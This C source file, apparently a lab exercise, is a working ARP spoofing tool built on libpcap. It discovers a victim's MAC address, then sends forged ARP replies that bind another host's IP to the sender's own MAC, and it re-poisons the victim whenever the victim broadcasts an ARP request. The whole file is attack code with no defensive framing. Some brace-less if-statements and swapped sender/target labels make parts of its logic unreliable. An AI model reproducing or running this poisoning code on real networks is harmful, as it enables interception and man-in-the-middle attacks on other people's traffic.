#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <arpheader.h>
#include <stdlib.h>


#define PACKETSIZE sizeof(struct allpacket)

void input(char* argv[],pcap_t *handle,int sw,const u_char *packet)
{
    int change_sender_ip = 0;
    int change_target_ip = 0;

    if(sw == 1 || sw == 2){
        change_sender_ip = 2;
        change_target_ip = 3;
    }
    if(sw == 3 || sw == 4){
        change_sender_ip = 4;
        change_target_ip = 5;
    }
    /*
   //IP check
  int i=0;
  for(i=2;i<4;i++)
  {
      printf("aa %s\n",argv[i]);
  }*/

   // Mac Adderss -------------------------------
  struct ifreq s;
  int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

  strcpy(s.ifr_name, "eth0");
  ioctl(fd, SIOCGIFHWADDR, &s);

  printf("My Mac Address : ");
  for (int x = 0; x < 6; ++x)
  printf("%02x ", (u_char) s.ifr_addr.sa_data[x]);
  printf("\n");

  //--------------------------------------------



  struct ether_header * ethhdr = (struct ether_header *) packet;
  u_char pkt[PACKETSIZE];
  struct allpacket *s_packet = (struct allpacket *)pkt;
  //struct allpacket *s_packet = malloc(sizeof(struct allpacket));
  //struct allpacket *r_packet = (struct allpacket *) (packet);
  // dmac search--------------------------------------


  switch(sw)
  {
  case 1:
  case 3:
      printf("dmac :");
     for(int i=0;i<=5;i++)
     {
        s_packet->e_dmac[i] = 0xFF;
        printf("%02x ",s_packet->e_dmac[i]);
     }
     printf("\n");
     break;
  case 2:
  case 4:
      printf("dmac :");
      for(int i=0;i<=5;i++)
      {
          s_packet->e_dmac[i] = ethhdr->ether_shost[i];
          printf("%02x ",s_packet->e_dmac[i]);
      }
      printf("\n");
      break;
  }

      //smac --------------------------------------------
  printf("smac :");
    for(int i=0; i<=5;i++)
    {
        s_packet->e_smac[i] = (u_char)s.ifr_addr.sa_data[i];
        printf("%02x ",s_packet->e_smac[i]);
    }
    printf("\n");

      //  ARP 0x0806
      s_packet->type = ntohs(0x0806);
      printf("type : %04x\n",s_packet->type);
      //ARP-----------------------------
      // HardWare type : ethernet 1
      s_packet->hd_type = ntohs(0x0001);
      printf("hd_type %04x\n",s_packet->hd_type);

      // Protocol type : IPv4 0x0800
      s_packet->protocol_type = ntohs(0x0800);
      printf("protocol_type %04x\n",s_packet->protocol_type);

      // Hardware size 6 , Protocol size 4
      s_packet->hd_size = 0x06;
      s_packet->protocol_size = 0x04;

      printf("hd_size %02x\n",s_packet->hd_size);
      printf("protocol_size %02x\n",s_packet->protocol_size);

      // OPcode 1 = request ,2 = reply
      switch (sw) {
      case 1:
      case 3:
          s_packet->opcode = ntohs(0x0001);
          printf("opcode %04x\n",s_packet->opcode);
          break;
      case 2:
      case 4:
          s_packet->opcode = ntohs(0x0002);
          printf("opcode %04x\n",s_packet->opcode);

          break;
      }

      // target Mac
      printf("sender mac : ");
      for(int i=0; i<=5;i++)
      {
           s_packet->a_s_mac[i] = s_packet->e_smac[i] ;
           printf(" %02x ", s_packet->a_s_mac[i]);
      }
      printf("\n");
      // target IP

      s_packet->a_s_protocol[0] = inet_addr(argv[change_target_ip])&0x000000FF;
      s_packet->a_s_protocol[1] = (inet_addr(argv[change_target_ip])&0x0000FF00)>>8;
      s_packet->a_s_protocol[2] = (inet_addr(argv[change_target_ip])&0x00FF0000)>>16;
      s_packet->a_s_protocol[3] = (inet_addr(argv[change_target_ip])&0xFF000000)>>24;

        printf("sender IP %d",inet_addr(argv[change_target_ip])&0x000000FF);
        printf(" %d",(inet_addr(argv[change_target_ip])&0x0000FF00)>>8);
        printf(" %d",(inet_addr(argv[change_target_ip])&0x00FF0000)>>16);
        printf(" %d",(inet_addr(argv[change_target_ip])&0xFF000000)>>24);
        printf("\n");

        // sender Mac
      switch (sw) {
        case 1:
        case 3:
          printf("Target Mac : ");
          for(int i=0;i<=5;i++)
          {
              s_packet->a_t_mac[i] = 0x00;
              printf("%02x ",s_packet->a_t_mac[i]);
          }
          printf("\n");
          break;

        case 2:
          case 4:
          printf("taget mac: ");
          for(int i=0;i<=5;i++)
          {
              s_packet->a_t_mac[i] = ethhdr->ether_shost[i];
              printf("%02x ",s_packet->a_t_mac[i]);
          }
          printf("\n");
          break;

      }

     // sender IP
     s_packet->a_t_protocol[0] = inet_addr(argv[change_sender_ip])&0x000000FF;
     s_packet->a_t_protocol[1] = (inet_addr(argv[change_sender_ip])&0x0000FF00)>>8;
     s_packet->a_t_protocol[2] = (inet_addr(argv[change_sender_ip])&0x00FF0000)>>16;
     s_packet->a_t_protocol[3] = (inet_addr(argv[change_sender_ip])&0xFF000000)>>24;

     printf("Target IP %d",inet_addr(argv[change_sender_ip])&0x000000FF);
     printf(" %d",(inet_addr(argv[change_sender_ip])&0x0000FF00)>>8);
     printf(" %d",(inet_addr(argv[change_sender_ip])&0x00FF0000)>>16);
     printf(" %d \n",(inet_addr(argv[change_sender_ip])&0xFF000000)>>24);
     /*
     printf("%02x \n",packet[38]);
     printf("%02x \n",packet[39]);
     printf("%02x \n",packet[40]);
     printf("%02x \n",packet[41]);
      */

        int res = pcap_sendpacket(handle,pkt,sizeof(pkt));

        if(res == -1)
             printf(" error\n");
        else
            printf("**********************************success \n");




}

int main(int argc, char* argv[]) {

      if (argc < 4) {
         printf("error\n");
         return -1;
       }

      char* dev = argv[1];
      char errbuf[PCAP_ERRBUF_SIZE];
      pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
      if (handle == NULL) {
        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
        return -1;
      }
        int argv1 =1;
        int argv2 =2;
        int argv3 =3;
        int argv4 =4;

        struct pcap_pkthdr* header;
        const u_char* packet;


        u_char save_sender_mac[2][6];
        //u_char dsave_sender_mac[2][6];
        // struct allpacket * new_packet = (struct allpacket *) packet;
        int sender_smac_ch=0;

        for(int count=1; count<=2; count++)
        {
            if(count == 1)
                input(argv,handle,argv1,0);
            if(argc == 6 && count == 2)
                input(argv,handle,argv3,0);

            pcap_next_ex(handle, &header, &packet);
            struct allpacket * new_packet = (struct allpacket *) packet;



            //save packet
            /*
            for(int i=0; i<=5; i++)
            {
                    dsave_sender_mac[count-1][i] = new_packet->e_smac[i];
                    printf("        *****save packet %02x \n",dsave_sender_mac[count-1][i]);
            }
            if(count == 1 || argc == 6)
            for(int x=0; x<=5; x++)
            {
                    if(dsave_sender_mac[count-1][x] == new_packet->e_smac[x] )
                        //printf("******************%d\n",sender_smac_ch);
                        sender_smac_ch += 1;
            }
            */

            if(ntohs(new_packet->type) == ETHERTYPE_ARP
                    && ntohs(new_packet->opcode) == ARPOP_REPLY)
                if(count == 1)
                    input(argv,handle,argv2,packet);
                if(argc == 6 && count == 2)
                    input(argv,handle,argv4,packet);

                if(count == 1 || argc == 6)
                    for(int i=0; i<=5; i++)
                    {
                            save_sender_mac[count-1][i] = new_packet->e_smac[i];
                            printf("        *****save packet %02x \n",save_sender_mac[count-1][i]);
                    }

                    for(int x=0; x<=5; x++)
                    {
                            if(save_sender_mac[count-1][x] == new_packet->e_smac[x] )
                                //printf("******************%d\n",sender_smac_ch);
                                sender_smac_ch += 1;
                    }
        }


        while(1)
        {
            int argv1_sender_smac_ch=0;
            int argv3_sender_smac_ch=0;
            int sender_dmac_ch=0;
            pcap_next_ex(handle, &header, &packet);
            struct allpacket * while_packet = (struct allpacket *) packet;


            for(int x=0; x<=5; x++)
            {
                    //printf("%02x:",while_packet->e_dmac[x]);
                    if(save_sender_mac[0][x] == while_packet->e_smac[x] )
                        argv1_sender_smac_ch += 1;
                    if(save_sender_mac[1][x] == while_packet->e_smac[x] )
                        argv3_sender_smac_ch += 1;
                    if(while_packet->e_dmac[x] == 0xFF )
                        sender_dmac_ch +=1;
            }
            //printf("\n");

            printf("search...\n");

            //if(ntohs(while_packet->type) == 0x0806)
            //    printf("type :: %04x \n",ntohs(while_packet->type));
            //if(ntohs(while_packet->opcode) == 0x0001)
            //    printf("opcode :: %04x \n",ntohs(while_packet->opcode));
            //if(sender_smac_ch == 5)
            //    printf("semder_smac_ch :: %d \n",sender_smac_ch);
            //if(sender_dmac_ch == 5)
            //    printf("semder_dmac_ch :: %d \n",sender_dmac_ch);

            if(ntohs(while_packet->type) == 0x0806 && ntohs(while_packet->opcode) == 0x0001
                    && argv1_sender_smac_ch == 6 && sender_dmac_ch == 6)
            {
                printf("        ****************************find!!  \n");
                input(argv,handle,2,packet);
            }

            if(ntohs(while_packet->type) == 0x0806 && ntohs(while_packet->opcode) == 0x0001
                    && argv3_sender_smac_ch == 6 && sender_dmac_ch == 6)
            {
                printf("        ****************************find!!  \n");
                input(argv,handle,4,packet);
            }
        }

      pcap_close(handle);
      return 0;
    }

